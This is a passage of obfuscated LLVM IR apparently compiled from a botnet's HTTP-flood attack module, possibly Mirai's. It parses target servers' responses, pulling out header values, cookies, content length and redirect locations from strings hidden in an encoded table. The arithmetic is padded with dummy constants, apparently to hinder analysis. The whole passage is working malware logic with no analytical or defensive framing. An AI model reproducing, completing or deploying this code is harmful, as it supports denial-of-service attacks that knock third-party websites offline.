  %1345 = sub i32 0, 2
  %1346 = add i32 %1344, %1345
  %1347 = sub nsw i32 %1344, 2
  store i32 %1346, i32* %39, align 4
  br label %1348

; <label>:1348:                                   ; preds = %1343, %1337
  %1349 = load i32, i32* %38, align 4
  %1350 = load i32, i32* %39, align 4
  %1351 = sub i32 %1349, 1978300699
  %1352 = add i32 %1351, %1350
  %1353 = add i32 %1352, 1978300699
  %1354 = add nsw i32 %1349, %1350
  %1355 = sext i32 %1353 to i64
  %1356 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1355
  store i8 0, i8* %1356, align 1
  %1357 = load i8*, i8** %40, align 8
  %1358 = load i8*, i8** %40, align 8
  %1359 = call i32 @util_strlen(i8* %1358)
  %1360 = call i8* @table_retrieve_val(i32 43, i32* null)
  %1361 = call i32 @util_stristr(i8* %1357, i32 %1359, i8* %1360)
  %1362 = icmp ne i32 %1361, 0
  br i1 %1362, label %1363, label %1366

; <label>:1363:                                   ; preds = %1348
  %1364 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1365 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1364, i32 0, i32 12
  store i32 1, i32* %1365, align 4
  br label %1366

; <label>:1366:                                   ; preds = %1363, %1348
  br label %1367

; <label>:1367:                                   ; preds = %1366, %1324
  br label %1368

; <label>:1368:                                   ; preds = %1367, %1300
  %1369 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1369, i32 0, i32 13
  store i32 0, i32* %1370, align 4
  %1371 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1372 = load i32, i32* %12, align 4
  %1373 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1374 = call i32 @util_stristr(i8* %1371, i32 %1372, i8* %1373)
  %1375 = icmp ne i32 %1374, -1
  br i1 %1375, label %1376, label %1440

; <label>:1376:                                   ; preds = %1368
  %1377 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1378 = load i32, i32* %12, align 4
  %1379 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1380 = call i32 @util_stristr(i8* %1377, i32 %1378, i8* %1379)
  store i32 %1380, i32* %41, align 4
  %1381 = load i32, i32* %41, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1382
  %1384 = load i8, i8* %1383, align 1
  %1385 = sext i8 %1384 to i32
  %1386 = icmp eq i32 %1385, 32
  br i1 %1386, label %1387, label %1393

; <label>:1387:                                   ; preds = %1376
  %1388 = load i32, i32* %41, align 4
  %1389 = add i32 %1388, 306500803
  %1390 = add i32 %1389, 1
  %1391 = sub i32 %1390, 306500803
  %1392 = add nsw i32 %1388, 1
  store i32 %1391, i32* %41, align 4
  br label %1393

; <label>:1393:                                   ; preds = %1387, %1376
  %1394 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1395 = load i32, i32* %41, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds i8, i8* %1394, i64 %1396
  %1398 = load i32, i32* %12, align 4
  %1399 = load i32, i32* %41, align 4
  %1400 = add i32 %1398, -1016348662
  %1401 = sub i32 %1400, %1399
  %1402 = sub i32 %1401, -1016348662
  %1403 = sub nsw i32 %1398, %1399
  %1404 = call i32 @util_memsearch(i8* %1397, i32 %1402, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1404, i32* %42, align 4
  %1405 = load i32, i32* %42, align 4
  %1406 = icmp ne i32 %1405, -1
  br i1 %1406, label %1407, label %1439

; <label>:1407:                                   ; preds = %1393
  %1408 = load i32, i32* %41, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1409
  store i8* %1410, i8** %43, align 8
  %1411 = load i32, i32* %42, align 4
  %1412 = icmp sge i32 %1411, 2
  br i1 %1412, label %1413, label %1419

; <label>:1413:                                   ; preds = %1407
  %1414 = load i32, i32* %42, align 4
  %1415 = sub i32 %1414, -722237899
  %1416 = sub i32 %1415, 2
  %1417 = add i32 %1416, -722237899
  %1418 = sub nsw i32 %1414, 2
  store i32 %1417, i32* %42, align 4
  br label %1419

; <label>:1419:                                   ; preds = %1413, %1407
  %1420 = load i32, i32* %41, align 4
  %1421 = load i32, i32* %42, align 4
  %1422 = sub i32 0, %1420
  %1423 = sub i32 0, %1421
  %1424 = add i32 %1422, %1423
  %1425 = sub i32 0, %1424
  %1426 = add nsw i32 %1420, %1421
  %1427 = sext i32 %1425 to i64
  %1428 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1427
  store i8 0, i8* %1428, align 1
  %1429 = load i8*, i8** %43, align 8
  %1430 = load i8*, i8** %43, align 8
  %1431 = call i32 @util_strlen(i8* %1430)
  %1432 = call i8* @table_retrieve_val(i32 42, i32* null)
  %1433 = call i32 @util_stristr(i8* %1429, i32 %1431, i8* %1432)
  %1434 = icmp ne i32 %1433, 0
  br i1 %1434, label %1435, label %1438

; <label>:1435:                                   ; preds = %1419
  %1436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1436, i32 0, i32 13
  store i32 1, i32* %1437, align 4
  br label %1438

; <label>:1438:                                   ; preds = %1435, %1419
  br label %1439

; <label>:1439:                                   ; preds = %1438, %1393
  br label %1440

; <label>:1440:                                   ; preds = %1439, %1368
  %1441 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1442 = load i32, i32* %12, align 4
  %1443 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1444 = call i32 @util_stristr(i8* %1441, i32 %1442, i8* %1443)
  %1445 = icmp ne i32 %1444, -1
  br i1 %1445, label %1446, label %1501

; <label>:1446:                                   ; preds = %1440
  %1447 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1448 = load i32, i32* %12, align 4
  %1449 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1450 = call i32 @util_stristr(i8* %1447, i32 %1448, i8* %1449)
  store i32 %1450, i32* %44, align 4
  %1451 = load i32, i32* %44, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1452
  %1454 = load i8, i8* %1453, align 1
  %1455 = sext i8 %1454 to i32
  %1456 = icmp eq i32 %1455, 32
  br i1 %1456, label %1457, label %1463

; <label>:1457:                                   ; preds = %1446
  %1458 = load i32, i32* %44, align 4
  %1459 = add i32 %1458, 929252579
  %1460 = add i32 %1459, 1
  %1461 = sub i32 %1460, 929252579
  %1462 = add nsw i32 %1458, 1
  store i32 %1461, i32* %44, align 4
  br label %1463

; <label>:1463:                                   ; preds = %1457, %1446
  %1464 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1465 = load i32, i32* %44, align 4
  %1466 = sext i32 %1465 to i64
  %1467 = getelementptr inbounds i8, i8* %1464, i64 %1466
  %1468 = load i32, i32* %12, align 4
  %1469 = load i32, i32* %44, align 4
  %1470 = add i32 %1468, -2024063092
  %1471 = sub i32 %1470, %1469
  %1472 = sub i32 %1471, -2024063092
  %1473 = sub nsw i32 %1468, %1469
  %1474 = call i32 @util_memsearch(i8* %1467, i32 %1472, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1474, i32* %45, align 4
  %1475 = load i32, i32* %45, align 4
  %1476 = icmp ne i32 %1475, -1
  br i1 %1476, label %1477, label %1500

; <label>:1477:                                   ; preds = %1463
  %1478 = load i32, i32* %44, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1479
  store i8* %1480, i8** %46, align 8
  %1481 = load i32, i32* %45, align 4
  %1482 = icmp sge i32 %1481, 2
  br i1 %1482, label %1483, label %1488

; <label>:1483:                                   ; preds = %1477
  %1484 = load i32, i32* %45, align 4
  %1485 = sub i32 0, 2
  %1486 = add i32 %1484, %1485
  %1487 = sub nsw i32 %1484, 2
  store i32 %1486, i32* %45, align 4
  br label %1488

; <label>:1488:                                   ; preds = %1483, %1477
  %1489 = load i32, i32* %44, align 4
  %1490 = load i32, i32* %45, align 4
  %1491 = sub i32 0, %1490
  %1492 = sub i32 %1489, %1491
  %1493 = add nsw i32 %1489, %1490
  %1494 = sext i32 %1492 to i64
  %1495 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1494
  store i8 0, i8* %1495, align 1
  %1496 = load i8*, i8** %46, align 8
  %1497 = call i32 @util_atoi(i8* %1496, i32 10)
  %1498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1498, i32 0, i32 14
  store i32 %1497, i32* %1499, align 4
  br label %1500

; <label>:1500:                                   ; preds = %1488, %1463
  br label %1504

; <label>:1501:                                   ; preds = %1440
  %1502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1502, i32 0, i32 14
  store i32 0, i32* %1503, align 4
  br label %1504

; <label>:1504:                                   ; preds = %1501, %1500
  store i32 0, i32* %37, align 4
  br label %1505

; <label>:1505:                                   ; preds = %1724, %1504
  %1506 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1507 = load i32, i32* %37, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds i8, i8* %1506, i64 %1508
  %1510 = load i32, i32* %12, align 4
  %1511 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1512 = call i32 @util_stristr(i8* %1509, i32 %1510, i8* %1511)
  %1513 = icmp ne i32 %1512, -1
  br i1 %1513, label %1514, label %1519

; <label>:1514:                                   ; preds = %1505
  %1515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1515, i32 0, i32 15
  %1517 = load i32, i32* %1516, align 4
  %1518 = icmp slt i32 %1517, 5
  br label %1519

; <label>:1519:                                   ; preds = %1514, %1505
  %1520 = phi i1 [ false, %1505 ], [ %1518, %1514 ]
  br i1 %1520, label %1521, label %1732

; <label>:1521:                                   ; preds = %1519
  %1522 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1523 = load i32, i32* %37, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds i8, i8* %1522, i64 %1524
  %1526 = load i32, i32* %12, align 4
  %1527 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1528 = call i32 @util_stristr(i8* %1525, i32 %1526, i8* %1527)
  store i32 %1528, i32* %47, align 4
  %1529 = load i32, i32* %37, align 4
  %1530 = load i32, i32* %47, align 4
  %1531 = sub i32 0, %1529
  %1532 = sub i32 0, %1530
  %1533 = add i32 %1531, %1532
  %1534 = sub i32 0, %1533
  %1535 = add nsw i32 %1529, %1530
  %1536 = sext i32 %1534 to i64
  %1537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1536
  %1538 = load i8, i8* %1537, align 1
  %1539 = sext i8 %1538 to i32
  %1540 = icmp eq i32 %1539, 32
  br i1 %1540, label %1541, label %1546

; <label>:1541:                                   ; preds = %1521
  %1542 = load i32, i32* %47, align 4
  %1543 = sub i32 0, 1
  %1544 = sub i32 %1542, %1543
  %1545 = add nsw i32 %1542, 1
  store i32 %1544, i32* %47, align 4
  br label %1546

; <label>:1546:                                   ; preds = %1541, %1521
  %1547 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1548 = load i32, i32* %37, align 4
  %1549 = sext i32 %1548 to i64
  %1550 = getelementptr inbounds i8, i8* %1547, i64 %1549
  %1551 = load i32, i32* %47, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds i8, i8* %1550, i64 %1552
  %1554 = load i32, i32* %12, align 4
  %1555 = load i32, i32* %37, align 4
  %1556 = add i32 %1554, 1874199069
  %1557 = sub i32 %1556, %1555
  %1558 = sub i32 %1557, 1874199069
  %1559 = sub nsw i32 %1554, %1555
  %1560 = load i32, i32* %47, align 4
  %1561 = sub i32 %1558, -340017235
  %1562 = sub i32 %1561, %1560
  %1563 = add i32 %1562, -340017235
  %1564 = sub nsw i32 %1558, %1560
  %1565 = call i32 @util_memsearch(i8* %1553, i32 %1563, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1565, i32* %48, align 4
  %1566 = load i32, i32* %48, align 4
  %1567 = icmp ne i32 %1566, -1
  br i1 %1567, label %1568, label %1724

; <label>:1568:                                   ; preds = %1546
  %1569 = load i32, i32* %37, align 4
  %1570 = load i32, i32* %47, align 4
  %1571 = sub i32 0, %1570
  %1572 = sub i32 %1569, %1571
  %1573 = add nsw i32 %1569, %1570
  %1574 = sext i32 %1572 to i64
  %1575 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1574
  store i8* %1575, i8** %49, align 8
  %1576 = load i32, i32* %48, align 4
  %1577 = icmp sge i32 %1576, 2
  br i1 %1577, label %1578, label %1583

; <label>:1578:                                   ; preds = %1568
  %1579 = load i32, i32* %48, align 4
  %1580 = sub i32 0, 2
  %1581 = add i32 %1579, %1580
  %1582 = sub nsw i32 %1579, 2
  store i32 %1581, i32* %48, align 4
  br label %1583

; <label>:1583:                                   ; preds = %1578, %1568
  %1584 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1585 = load i32, i32* %37, align 4
  %1586 = sext i32 %1585 to i64
  %1587 = getelementptr inbounds i8, i8* %1584, i64 %1586
  %1588 = load i32, i32* %47, align 4
  %1589 = sext i32 %1588 to i64
  %1590 = getelementptr inbounds i8, i8* %1587, i64 %1589
  %1591 = load i32, i32* %12, align 4
  %1592 = load i32, i32* %37, align 4
  %1593 = sub i32 %1591, -201148595
  %1594 = sub i32 %1593, %1592
  %1595 = add i32 %1594, -201148595
  %1596 = sub nsw i32 %1591, %1592
  %1597 = load i32, i32* %47, align 4
  %1598 = sub i32 %1595, -1520522484
  %1599 = sub i32 %1598, %1597
  %1600 = add i32 %1599, -1520522484
  %1601 = sub nsw i32 %1595, %1597
  %1602 = call i32 @util_memsearch(i8* %1590, i32 %1600, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1603 = icmp sgt i32 %1602, 0
  br i1 %1603, label %1604, label %1627

; <label>:1604:                                   ; preds = %1583
  %1605 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1606 = load i32, i32* %37, align 4
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds i8, i8* %1605, i64 %1607
  %1609 = load i32, i32* %47, align 4
  %1610 = sext i32 %1609 to i64
  %1611 = getelementptr inbounds i8, i8* %1608, i64 %1610
  %1612 = load i32, i32* %12, align 4
  %1613 = load i32, i32* %37, align 4
  %1614 = sub i32 0, %1613
  %1615 = add i32 %1612, %1614
  %1616 = sub nsw i32 %1612, %1613
  %1617 = load i32, i32* %47, align 4
  %1618 = add i32 %1615, -1697290693
  %1619 = sub i32 %1618, %1617
  %1620 = sub i32 %1619, -1697290693
  %1621 = sub nsw i32 %1615, %1617
  %1622 = call i32 @util_memsearch(i8* %1611, i32 %1620, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1623 = sub i32 %1622, -906053395
  %1624 = sub i32 %1623, 1
  %1625 = add i32 %1624, -906053395
  %1626 = sub nsw i32 %1622, 1
  store i32 %1625, i32* %48, align 4
  br label %1627

; <label>:1627:                                   ; preds = %1604, %1583
  %1628 = load i32, i32* %37, align 4
  %1629 = load i32, i32* %47, align 4
  %1630 = add i32 %1628, -1649572315
  %1631 = add i32 %1630, %1629
  %1632 = sub i32 %1631, -1649572315
  %1633 = add nsw i32 %1628, %1629
  %1634 = load i32, i32* %48, align 4
  %1635 = add i32 %1632, -767946274
  %1636 = add i32 %1635, %1634
  %1637 = sub i32 %1636, -767946274
  %1638 = add nsw i32 %1632, %1634
  %1639 = sext i32 %1637 to i64
  %1640 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1639
  store i8 0, i8* %1640, align 1
  store i32 0, i32* %10, align 4
  br label %1641

; <label>:1641:                                   ; preds = %1656, %1627
  %1642 = load i32, i32* %10, align 4
  %1643 = load i8*, i8** %49, align 8
  %1644 = call i32 @util_strlen(i8* %1643)
  %1645 = icmp slt i32 %1642, %1644
  br i1 %1645, label %1646, label %1662

; <label>:1646:                                   ; preds = %1641
  %1647 = load i8*, i8** %49, align 8
  %1648 = load i32, i32* %10, align 4
  %1649 = sext i32 %1648 to i64
  %1650 = getelementptr inbounds i8, i8* %1647, i64 %1649
  %1651 = load i8, i8* %1650, align 1
  %1652 = sext i8 %1651 to i32
  %1653 = icmp eq i32 %1652, 61
  br i1 %1653, label %1654, label %1655

; <label>:1654:                                   ; preds = %1646
  br label %1662

; <label>:1655:                                   ; preds = %1646
  br label %1656

; <label>:1656:                                   ; preds = %1655
  %1657 = load i32, i32* %10, align 4
  %1658 = sub i32 %1657, 1683095262
  %1659 = add i32 %1658, 1
  %1660 = add i32 %1659, 1683095262
  %1661 = add nsw i32 %1657, 1
  store i32 %1660, i32* %10, align 4
  br label %1641

; <label>:1662:                                   ; preds = %1654, %1641
  %1663 = load i8*, i8** %49, align 8
  %1664 = load i32, i32* %10, align 4
  %1665 = sext i32 %1664 to i64
  %1666 = getelementptr inbounds i8, i8* %1663, i64 %1665
  %1667 = load i8, i8* %1666, align 1
  %1668 = sext i8 %1667 to i32
  %1669 = icmp eq i32 %1668, 61
  br i1 %1669, label %1670, label %1723

; <label>:1670:                                   ; preds = %1662
  %1671 = load i32, i32* %10, align 4
  store i32 %1671, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1672

; <label>:1672:                                   ; preds = %1691, %1670
  %1673 = load i32, i32* %10, align 4
  %1674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1674, i32 0, i32 15
  %1676 = load i32, i32* %1675, align 4
  %1677 = icmp slt i32 %1673, %1676
  br i1 %1677, label %1678, label %1697

; <label>:1678:                                   ; preds = %1672
  %1679 = load i8*, i8** %49, align 8
  %1680 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1681 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1680, i32 0, i32 16
  %1682 = load i32, i32* %10, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1681, i64 0, i64 %1683
  %1685 = getelementptr inbounds [128 x i8], [128 x i8]* %1684, i32 0, i32 0
  %1686 = load i32, i32* %50, align 4
  %1687 = call signext i8 @util_strncmp(i8* %1679, i8* %1685, i32 %1686)
  %1688 = icmp ne i8 %1687, 0
  br i1 %1688, label %1689, label %1690

; <label>:1689:                                   ; preds = %1678
  store i32 1, i32* %51, align 4
  br label %1697

; <label>:1690:                                   ; preds = %1678
  br label %1691

; <label>:1691:                                   ; preds = %1690
  %1692 = load i32, i32* %10, align 4
  %1693 = add i32 %1692, 1453129876
  %1694 = add i32 %1693, 1
  %1695 = sub i32 %1694, 1453129876
  %1696 = add nsw i32 %1692, 1
  store i32 %1695, i32* %10, align 4
  br label %1672

; <label>:1697:                                   ; preds = %1689, %1672
  %1698 = load i32, i32* %51, align 4
  %1699 = icmp ne i32 %1698, 0
  br i1 %1699, label %1722, label %1700

; <label>:1700:                                   ; preds = %1697
  %1701 = load i8*, i8** %49, align 8
  %1702 = call i32 @util_strlen(i8* %1701)
  %1703 = icmp slt i32 %1702, 128
  br i1 %1703, label %1704, label %1721

; <label>:1704:                                   ; preds = %1700
  %1705 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1706 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1705, i32 0, i32 16
  %1707 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1708 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1707, i32 0, i32 15
  %1709 = load i32, i32* %1708, align 4
  %1710 = sext i32 %1709 to i64
  %1711 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1706, i64 0, i64 %1710
  %1712 = getelementptr inbounds [128 x i8], [128 x i8]* %1711, i32 0, i32 0
  %1713 = load i8*, i8** %49, align 8
  %1714 = call i32 @util_strcpy(i8* %1712, i8* %1713)
  %1715 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1716 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1715, i32 0, i32 15
  %1717 = load i32, i32* %1716, align 4
  %1718 = sub i32 0, 1
  %1719 = sub i32 %1717, %1718
  %1720 = add nsw i32 %1717, 1
  store i32 %1719, i32* %1716, align 4
  br label %1721

; <label>:1721:                                   ; preds = %1704, %1700
  br label %1722

; <label>:1722:                                   ; preds = %1721, %1697
  br label %1723

; <label>:1723:                                   ; preds = %1722, %1662
  br label %1724

; <label>:1724:                                   ; preds = %1723, %1546
  %1725 = load i32, i32* %47, align 4
  %1726 = load i32, i32* %37, align 4
  %1727 = sub i32 0, %1726
  %1728 = sub i32 0, %1725
  %1729 = add i32 %1727, %1728
  %1730 = sub i32 0, %1729
  %1731 = add nsw i32 %1726, %1725
  store i32 %1730, i32* %37, align 4
  br label %1505

; <label>:1732:                                   ; preds = %1519
  %1733 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1734 = load i32, i32* %12, align 4
  %1735 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1736 = call i32 @util_stristr(i8* %1733, i32 %1734, i8* %1735)
  %1737 = icmp ne i32 %1736, -1
  br i1 %1737, label %1738, label %1957

; <label>:1738:                                   ; preds = %1732
  %1739 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1740 = load i32, i32* %12, align 4
  %1741 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1742 = call i32 @util_stristr(i8* %1739, i32 %1740, i8* %1741)
  store i32 %1742, i32* %52, align 4
  %1743 = load i32, i32* %52, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1744
  %1746 = load i8, i8* %1745, align 1
  %1747 = sext i8 %1746 to i32
  %1748 = icmp eq i32 %1747, 32
  br i1 %1748, label %1749, label %1756

; <label>:1749:                                   ; preds = %1738
  %1750 = load i32, i32* %52, align 4
  %1751 = sub i32 0, %1750
  %1752 = sub i32 0, 1
  %1753 = add i32 %1751, %1752
  %1754 = sub i32 0, %1753
  %1755 = add nsw i32 %1750, 1
  store i32 %1754, i32* %52, align 4
  br label %1756

; <label>:1756:                                   ; preds = %1749, %1738
  %1757 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1758 = load i32, i32* %52, align 4
  %1759 = sext i32 %1758 to i64
  %1760 = getelementptr inbounds i8, i8* %1757, i64 %1759
  %1761 = load i32, i32* %12, align 4
  %1762 = load i32, i32* %52, align 4
  %1763 = sub i32 0, %1762
  %1764 = add i32 %1761, %1763
  %1765 = sub nsw i32 %1761, %1762
  %1766 = call i32 @util_memsearch(i8* %1760, i32 %1764, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1766, i32* %53, align 4
  %1767 = load i32, i32* %53, align 4
  %1768 = icmp ne i32 %1767, -1
  br i1 %1768, label %1769, label %1956

; <label>:1769:                                   ; preds = %1756
  %1770 = load i32, i32* %52, align 4
  %1771 = sext i32 %1770 to i64
  %1772 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1771
  store i8* %1772, i8** %54, align 8
  %1773 = load i32, i32* %53, align 4
  %1774 = icmp sge i32 %1773, 2
  br i1 %1774, label %1775, label %1781

; <label>:1775:                                   ; preds = %1769
  %1776 = load i32, i32* %53, align 4
  %1777 = sub i32 %1776, 842881365
  %1778 = sub i32 %1777, 2
  %1779 = add i32 %1778, 842881365
  %1780 = sub nsw i32 %1776, 2
  store i32 %1779, i32* %53, align 4
  br label %1781

; <label>:1781:                                   ; preds = %1775, %1769
  %1782 = load i32, i32* %52, align 4
  %1783 = load i32, i32* %53, align 4
  %1784 = sub i32 %1782, 1305314389
  %1785 = add i32 %1784, %1783
  %1786 = add i32 %1785, 1305314389
  %1787 = add nsw i32 %1782, %1783
  %1788 = sext i32 %1786 to i64
  %1789 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1788
  store i8 0, i8* %1789, align 1
  %1790 = load i32, i32* %53, align 4
  %1791 = add i32 %1790, 1825768610
  %1792 = add i32 %1791, 1
  %1793 = sub i32 %1792, 1825768610
  %1794 = add nsw i32 %1790, 1
  store i32 %1793, i32* %53, align 4
  %1795 = load i8*, i8** %54, align 8
  %1796 = load i32, i32* %53, align 4
  %1797 = call i32 @util_memsearch(i8* %1795, i32 %1796, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1798 = icmp eq i32 %1797, 4
  br i1 %1798, label %1799, label %1906

; <label>:1799:                                   ; preds = %1781
  store i32 7, i32* %10, align 4
  %1800 = load i8*, i8** %54, align 8
  %1801 = getelementptr inbounds i8, i8* %1800, i64 4
  %1802 = load i8, i8* %1801, align 1
  %1803 = sext i8 %1802 to i32
  %1804 = icmp eq i32 %1803, 115
  br i1 %1804, label %1805, label %1811

; <label>:1805:                                   ; preds = %1799
  %1806 = load i32, i32* %10, align 4
  %1807 = add i32 %1806, -490210492
  %1808 = add i32 %1807, 1
  %1809 = sub i32 %1808, -490210492
  %1810 = add nsw i32 %1806, 1
  store i32 %1809, i32* %10, align 4
  br label %1811

; <label>:1811:                                   ; preds = %1805, %1799
  %1812 = load i8*, i8** %54, align 8
  %1813 = load i8*, i8** %54, align 8
  %1814 = load i32, i32* %10, align 4
  %1815 = sext i32 %1814 to i64
  %1816 = getelementptr inbounds i8, i8* %1813, i64 %1815
  %1817 = load i32, i32* %53, align 4
  %1818 = load i32, i32* %10, align 4
  %1819 = add i32 %1817, -608726099
  %1820 = sub i32 %1819, %1818
  %1821 = sub i32 %1820, -608726099
  %1822 = sub nsw i32 %1817, %1818
  %1823 = sext i32 %1821 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1812, i8* %1816, i64 %1823, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1824

; <label>:1824:                                   ; preds = %1845, %1811
  %1825 = load i8*, i8** %54, align 8
  %1826 = load i32, i32* %10, align 4
  %1827 = sext i32 %1826 to i64
  %1828 = getelementptr inbounds i8, i8* %1825, i64 %1827
  %1829 = load i8, i8* %1828, align 1
  %1830 = sext i8 %1829 to i32
  %1831 = icmp ne i32 %1830, 0
  br i1 %1831, label %1832, label %1850

; <label>:1832:                                   ; preds = %1824
  %1833 = load i8*, i8** %54, align 8
  %1834 = load i32, i32* %10, align 4
  %1835 = sext i32 %1834 to i64
  %1836 = getelementptr inbounds i8, i8* %1833, i64 %1835
  %1837 = load i8, i8* %1836, align 1
  %1838 = sext i8 %1837 to i32
  %1839 = icmp eq i32 %1838, 47
  br i1 %1839, label %1840, label %1845

; <label>:1840:                                   ; preds = %1832
  %1841 = load i8*, i8** %54, align 8
  %1842 = load i32, i32* %10, align 4
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds i8, i8* %1841, i64 %1843
  store i8 0, i8* %1844, align 1
  br label %1850

; <label>:1845:                                   ; preds = %1832
  %1846 = load i32, i32* %10, align 4
  %1847 = sub i32 0, 1
  %1848 = sub i32 %1846, %1847
  %1849 = add nsw i32 %1846, 1
  store i32 %1848, i32* %10, align 4
  br label %1824

; <label>:1850:                                   ; preds = %1840, %1824
  %1851 = load i8*, i8** %54, align 8
  %1852 = call i32 @util_strlen(i8* %1851)
  %1853 = icmp sgt i32 %1852, 0
  br i1 %1853, label %1854, label %1864

; <label>:1854:                                   ; preds = %1850
  %1855 = load i8*, i8** %54, align 8
  %1856 = call i32 @util_strlen(i8* %1855)
  %1857 = icmp slt i32 %1856, 128
  br i1 %1857, label %1858, label %1864

; <label>:1858:                                   ; preds = %1854
  %1859 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1860 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1859, i32 0, i32 7
  %1861 = getelementptr inbounds [129 x i8], [129 x i8]* %1860, i32 0, i32 0
  %1862 = load i8*, i8** %54, align 8
  %1863 = call i32 @util_strcpy(i8* %1861, i8* %1862)
  br label %1864

; <label>:1864:                                   ; preds = %1858, %1854, %1850
  %1865 = load i8*, i8** %54, align 8
  %1866 = load i32, i32* %10, align 4
  %1867 = add i32 %1866, 1568770262
  %1868 = add i32 %1867, 1
  %1869 = sub i32 %1868, 1568770262
  %1870 = add nsw i32 %1866, 1
  %1871 = sext i32 %1869 to i64
  %1872 = getelementptr inbounds i8, i8* %1865, i64 %1871
  %1873 = call i32 @util_strlen(i8* %1872)
  %1874 = icmp slt i32 %1873, 256
